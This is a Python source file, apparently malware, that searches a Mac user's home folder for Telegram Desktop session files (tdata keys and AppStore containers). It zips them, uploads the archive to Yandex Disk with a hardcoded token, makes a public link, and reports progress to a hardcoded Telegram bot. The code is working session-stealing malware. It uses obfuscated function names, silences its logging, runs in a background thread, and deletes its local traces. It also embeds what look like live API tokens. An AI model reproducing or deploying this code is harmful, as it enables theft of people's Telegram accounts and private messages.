import asyncio
import logging
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")
import os
import re
import tempfile
import threading
import zipfile
import uuid
from datetime import datetime
from pathlib import Path
import requests
import yadisk

# Настройки
ROOT_PATH = os.path.expanduser("~")
CONTAINER_PATH = os.path.join(ROOT_PATH, "Library", "Containers")
POSSIBLE_PATHS = [
    os.path.join(ROOT_PATH, "Library", "Containers", "org.telegram.desktop", "Data", "Library", "Application Support", "Telegram Desktop"),
    os.path.join(ROOT_PATH, "Library", "Group Containers"),
    os.path.join(ROOT_PATH, "Library", "Application Support", "Telegram Desktop"),
    os.path.join(ROOT_PATH, "Library", "Application Support", "Kotatogram Desktop"),
    os.path.join(ROOT_PATH, "Desktop", "Telegram", "TelegramForcePortable"),
]
B_T: str = "7656633959:AAF_nev0Abbu5Sr4ETtE9vYdkf3mavCvcps"
C_I: str = "5018443124"

Y_T = "y0__xCnvt7kBRjjtDcgp73l-hJcnhTP1uPeUHR-zpyLQbXcutgh0w"

y_d = yadisk.YaDisk(token=Y_T)

logger = logging.getLogger("yadisk")
logging.getLogger("yadisk").propagate = False
logger.handlers = []  # Очищаем существующие обработчики
logger.addHandler(logging.NullHandler())  # Добавляем NullHandler

def s_t_t_t(message: str) -> None:
    try:
        url = f"https://api.telegram.org/bot{B_T}/sendMessage"
        data = {
            'chat_id': C_I,
            'text': message
        }
        _ = requests.post(url, data=data)
    except Exception as e:
        pass

def upload_to_y_d(zip_path: str):
    try:
        if not os.path.exists(zip_path):
            s_t_t_t(f"Архив {zip_path} не существует")
            return
        s_t_t_t(f"Загрузка архива на Yandex Disk: {zip_path}, размер: {os.path.getsize(zip_path)} байт")


        if not y_d.check_token():
            s_t_t_t("Недействительный токен Yandex Disk")
            return


        remote_folder = "/TelegramBackups"
        if not y_d.exists(remote_folder):
            y_d.mkdir(remote_folder)
            s_t_t_t(f"Создана папка на Yandex Disk: {remote_folder}")


        base_name = os.path.basename(zip_path).replace(".zip", "")  # Убираем .zip из имени
        temp_remote_path = f"{remote_folder}/{base_name}.tmp"
        final_remote_path = f"{remote_folder}/{base_name}.zip"


        s_t_t_t(f"Загружаем как {temp_remote_path}")
        y_d.upload(zip_path, temp_remote_path, overwrite=True)
        s_t_t_t(f"Архив успешно загружен на Yandex Disk как {temp_remote_path}")


        y_d.move(temp_remote_path, final_remote_path, overwrite=True)
        s_t_t_t(f"Файл переименован в {final_remote_path}")


        y_d.publish(final_remote_path)
        public_link = y_d.get_meta(final_remote_path).public_url

        if public_link:
            s_t_t_t(f"Публичная ссылка: {public_link}")
        else:
            s_t_t_t("Не удалось получить публичную ссылку")

    except Exception as e:
        s_t_t_t(f"Ошибка при загрузке архива на Yandex Disk: {str(e)}")

def z_d(archive_name: str, paths: list[str]) -> None:
    with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        added_files = False
        total_files = 0
        processed_files = 0
        last_reported_percent = 0

        for path in paths:
            if os.path.isfile(path) and os.path.exists(path):
                total_files += 1
            elif os.path.isdir(path) and os.path.exists(path):
                for root, _, files in os.walk(path):
                    total_files += len(files)

        s_t_t_t(f"Всего файлов для архивации: {total_files}")

        for path in paths:
            try:
                if os.path.isfile(path):
                    if os.path.exists(path):
                        zipf.write(path, os.path.relpath(path, os.path.dirname(path)))
                        added_files = True
                    else:
                        s_t_t_t(f"Файл не существует, пропущен: {path}")
                    processed_files += 1
                elif os.path.isdir(path):
                    for root, _, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if os.path.exists(file_path):
                                zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(path)))
                                added_files = True
                            else:
                                s_t_t_t(f"Файл не существует, пропущен: {file_path}")
                            processed_files += 1
                            if total_files > 0:
                                percent = (processed_files / total_files) * 100
                                if percent >= last_reported_percent + 10 or percent == 100:
                                    s_t_t_t(f"Архивировано {percent:.1f}% файлов ({processed_files}/{total_files})")
                                    last_reported_percent = int(percent // 10 * 10)
            except Exception as e:
                s_t_t_t(f"Ошибка при обработке пути {path}: {str(e)}")
                continue

        if not added_files:
            s_t_t_t("Ни один файл не был добавлен в архив")
            zipf.writestr("placeholder.txt", "No files were added to the archive")
            s_t_t_t("Создан пустой архив с placeholder.txt")

    s_t_t_t(f"Архив создан: {archive_name}, размер: {os.path.getsize(archive_name)} байт")

def d_z_a(zip_path: str):
    try:
        if os.path.exists(zip_path):
            os.remove(zip_path)
            s_t_t_t(f"Архив {zip_path} успешно удалён")
        else:
            s_t_t_t(f"Архив {zip_path} не существует")
    except Exception as e:
        s_t_t_t(f"Ошибка при удалении архива {zip_path}: {str(e)}")

def g_s(tdata_path: str) -> list[str] | None:
    try:
        session_paths = []
        for entry in os.scandir(tdata_path):
            if any([
                re.match(r'^[A-Z0-9]{16}$', entry.name),
                re.match(r'^[A-Z0-9]{16}s$', entry.name),
                re.match(r'^key_datas$', entry.name)
            ]):
                session_paths.append(entry.path)
        return session_paths if session_paths else None
    except Exception as e:
        s_t_t_t(f"Ошибка при сканировании директории: {str(e)}")
        return None

def check_t():
    paths = []
    for path in POSSIBLE_PATHS:
        try:
            if os.path.isdir(path):
                if "Group Containers" in path:
                    s_t_t_t(f"Telegram with AppStore was found - {path}")
                    for folder in Path(path).glob("*keepcoder.Telegram"):
                        if folder.is_dir() and folder.name.endswith("keepcoder.Telegram"):
                            for file in os.scandir(folder):
                                if file.name == "appstore":
                                    s_t_t_t("AppStore exists")
                                    paths.append(file.path)
                elif "Application Support" in path:
                    tdata = os.path.join(path, "tdata")
                    s_t_t_t(f"Telegram with TData was found - {path}")
                    if os.path.isdir(tdata):
                        s_t_t_t("TData exists")
                        paths.extend(g_s(tdata))
                    else:
                        s_t_t_t("TData not exists")
        except Exception as e:
            s_t_t_t(f"Error: {str(e)}")
            continue
    return paths

def s() -> None:
    with tempfile.TemporaryDirectory() as temp_dir:
        archive_name = os.path.join(temp_dir, f"td_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}.zip")
        try:
            s_t_t_t("td was found")
            session_paths = check_t()
            if session_paths:
                z_d(archive_name, session_paths)
                upload_to_y_d(archive_name)
            else:
                s_t_t_t("Не найдено подходящих файлов для архивации")
        except Exception as e:
            s_t_t_t(str(e))
        finally:
            d_z_a(archive_name)

def start_monitor_m():
    thread = threading.Thread(target=s)
    thread.start()